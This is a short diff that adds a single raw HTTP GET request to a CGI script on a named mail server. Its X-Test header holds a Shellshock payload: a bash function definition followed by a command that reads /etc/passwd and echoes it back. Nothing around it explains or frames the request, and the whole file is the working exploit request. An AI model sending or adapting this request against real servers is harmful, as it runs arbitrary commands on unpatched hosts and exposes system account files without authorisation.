@@ -1,0 +1,9 @@
+GET /cgi-bin/madmin.cgi HTTP/1.1
+Host: mail.cscb.cn
+Proxy-Connection: keep-alive
+Cache-Control: max-age=0
+X-Test: () { :;};a=`/bin/cat /etc/passwd`;echo $a
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en,zh-CN;q=0.8,zh;q=0.6,ko;q=0.4,zh-TW;q=0.2,th;q=0.2,ja;q=0.2
